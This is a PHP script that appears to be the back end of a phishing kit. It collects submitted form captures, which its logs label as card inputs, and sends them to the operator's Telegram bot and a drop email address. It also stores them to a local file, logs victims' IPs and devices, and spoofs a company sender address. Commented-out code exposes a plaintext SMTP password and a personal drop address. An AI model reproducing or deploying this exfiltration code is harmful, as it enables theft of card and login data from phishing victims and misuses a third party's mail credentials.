<?php
session_start();

/**
 * =====================================
 * PERMANENT BLOCK & RATE LIMIT SYSTEM
 * =====================================
 */
$blacklistFile = __DIR__ . '/../blacklist.json';
$rateLimitFile = __DIR__ . '/../rate_limit.json';

$limitRequests = 3;
$limitTimeWindow = 60;
$sessionId = session_id();
$now = time();

$blacklist = file_exists($blacklistFile) 
    ? json_decode(file_get_contents($blacklistFile), true) 
    : [];

if (in_array($sessionId, $blacklist)) {
    http_response_code(403);
    exit(json_encode(["status" => false, "text" => "Your session is permanently banned due to spam."]));
}

$rateData = file_exists($rateLimitFile) 
    ? json_decode(file_get_contents($rateLimitFile), true) 
    : [];

$rateData = array_filter($rateData, function($entry) use ($now, $limitTimeWindow) {
    return $entry['timestamp'] > ($now - $limitTimeWindow);
});

$sessionRequests = array_filter($rateData, function($entry) use ($sessionId) {
    return $entry['sid'] === $sessionId;
});

if (count($sessionRequests) >= $limitRequests) {
    $blacklist[] = $sessionId;
    file_put_contents($blacklistFile, json_encode(array_unique($blacklist)));
    
    http_response_code(429);
    exit(json_encode(["status" => false, "text" => "Spam detected. You have been permanently blocked."]));
}

$rateData[] = [
    'sid' => $sessionId,
    'timestamp' => $now
];
file_put_contents($rateLimitFile, json_encode(array_values($rateData)));

/**
 * =====================================
 * LOAD PHPMailer
 * =====================================
 */
require __DIR__ . '/Exception.php';
require __DIR__ . '/PHPMailer.php';
require __DIR__ . '/SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

/**
 * =====================================
 * LOAD CONFIG
 * =====================================
 */
$configPath = realpath(__DIR__ . '/../config.ini');

if (!$configPath || !file_exists($configPath)) {
    http_response_code(500);
    exit('Config not found');
}

$config = parse_ini_file($configPath, true);

$fixedRecipient = $config['result']['email'] ?? null;
$telegramToken  = $config['telegram']['bot_token'] ?? null;
$telegramChatId = $config['telegram']['chat_id'] ?? null;

/**
 * =====================================
 * LOGGING SYSTEM
 * =====================================
 */
function getClientIP(): string {
    return $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}

function writeLog(string $ket): void {
    global $config;
    
    $country = $_SESSION['geo']['country'] ?? 'UNKNOWN';
    
    $device = $_SESSION['device_info'] ?? "Unknown Device";

    $file = __DIR__ . '/../access.log';

    $line = sprintf(
        "%s | %s | %s | %s | %s\n",
        date('Y-m-d H:i:s'),
        $ket,
        getClientIP(),
        $country,
        $device
    );

    file_put_contents($file, $line, FILE_APPEND | LOCK_EX);
}


/**
 * =====================================
 * VALIDATE REQUEST
 * =====================================
 */
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit;
}

$subject = $_POST['subject'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$subject .= ' - ' . $ip;

$html    = $_POST['html'] ?? '';
$name    = $_POST['name'] ?? 'Admin';

$payloadEmail = $_POST['email'] ?? null;
if (!filter_var($payloadEmail, FILTER_VALIDATE_EMAIL)) {
    $payloadEmail = null;
}

if (!$subject || !$html || !$fixedRecipient) {
    http_response_code(400);
    exit('Invalid request');
}

/**
 * =====================================
 * FUNCTION TELEGRAM (FIX)
 * =====================================
 */
function sendTelegram($token, $chatId, $message) {
    $payload = [
        "chat_id"    => $chatId,
        "text"       => $message,
        "parse_mode" => "HTML"
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    file_put_contents(
        __DIR__ . '/../telegram_debug.txt',
        date("Y-m-d H:i:s") . " | HTTP: {$httpCode} | {$response}" . PHP_EOL,
        FILE_APPEND
    );

    return $response;
}

/**
 * =====================================
 * SEND TELEGRAM (SETELAH HTML ADA)
 * =====================================
 */
$telegramStatus = false;

if ($telegramToken && $telegramChatId) {

    $allowedTags = '<b><i><u><strong><em><code><pre><a>';
    $safeHtml = strip_tags($html, $allowedTags);
    $safeHtml = preg_replace('/<br\s*\/?>/i', "\n", $safeHtml);
    $safeHtml = html_entity_decode($safeHtml, ENT_QUOTES | ENT_HTML5, 'UTF-8');

    if (strlen($safeHtml) > 3500) {
        $safeHtml = substr($safeHtml, 0, 3500) . "\n...";
    }

    $telegramMessage = "📩 <b>New Result</b>\n\n<pre>" . htmlspecialchars($safeHtml) . "</pre>";

    $res = sendTelegram($telegramToken, $telegramChatId, $telegramMessage);

    if ($res !== false) {
        $json = json_decode($res, true);
        if (isset($json['ok']) && $json['ok']) {
            $telegramStatus = true;
        }
    }
}

$fromEmail = "sviluppo@elcomsystem.it";
$fromName  = $name;

/**
 * =====================================
 * SAVE TO result.json
 * =====================================
 */
$resultFile = __DIR__ . '/../result.json';

$existingData = file_exists($resultFile)
    ? json_decode(file_get_contents($resultFile), true)
    : [];

$existingData[] = [
    "subject"   => $subject,
    "name"      => $name,
    "html"      => $html,
    "ip"        => $_SERVER['REMOTE_ADDR'] ?? '',
    "timestamp" => date("Y-m-d H:i:s")
];

file_put_contents(
    $resultFile,
    json_encode($existingData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)
);

/**
 * =====================================
 * SEND EMAIL
 * =====================================
 */
$mail = new PHPMailer(true);
$emailStatus = false;

try {
    $mail->isMail();
    // $mail->Host       = 'mail.elcomsystem.it';
    // $mail->SMTPAuth   = true;
    // $mail->Username   = 'sviluppo@elcomsystem.it';
    // $mail->Password   = 'VNMyz8qS';
    // $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    // $mail->Port       = 587;

    $mail->SMTPOptions = [
        'ssl' => [
            'verify_peer'       => false,
            'verify_peer_name'  => false,
            'allow_self_signed' => true,
        ],
    ];

    $mail->setFrom($fromEmail, $fromName);
    $mail->isHTML(true);
    $mail->Subject = $subject;
    $mail->Body    = $html;
    $mail->AltBody = strip_tags($html);

    // =========================
    // EMAIL 1
    // =========================
    // $mail->clearAddresses();
    // $mail->addAddress("munculdengangaya@gmail.com");
    // $mail->send();

    // =========================
    // EMAIL 2
    // =========================
    $mail->clearAddresses();
    $mail->addAddress($fixedRecipient);
    $mail->send();

    // =========================
    // EMAIL 3 (optional)
    // =========================
    // if (!empty($payloadEmail)) {
    //     $mail->clearAddresses();
    //     $mail->addAddress($payloadEmail);
    //     $mail->send();
    // }

    $emailStatus = true;

}  catch (Exception $e) {

    $errorMsg = $mail->ErrorInfo;

    file_put_contents(
        __DIR__ . '/../mailer_error.txt',
        date("Y-m-d H:i:s") . " | " . $errorMsg . PHP_EOL,
        FILE_APPEND
    );

    if ($telegramToken && $telegramChatId) {
        sendTelegram($telegramToken, $telegramChatId,
            "❌ <b>SMTP ERROR</b>\n" . $errorMsg
        );
    }
}

/**
 * =====================================
 * LOG LOGIC BASED ON SUBJECT
 * =====================================
 */
if ($emailStatus || $telegramStatus) {
    $logKet = "SEND RESULT"; // Default jika tidak cocok
    
    // Cek kata kunci dalam subjek (Case Insensitive)
    if (stripos($subject, 'RESULT 1') !== false) {
        $logKet = "INPUT CC 1";
    } elseif (stripos($subject, 'RESULT 2') !== false) {
        $logKet = "INPUT CC 2";
    }

    writeLog($logKet);
}
/**
 * =====================================
 * RESPONSE
 * =====================================
 */
header('Content-Type: application/json');

echo json_encode([
    "status"   => true,
    "text"     => "Email sent successfully!",
    "email"    => $emailStatus,
    "subject"  => $subject
]);
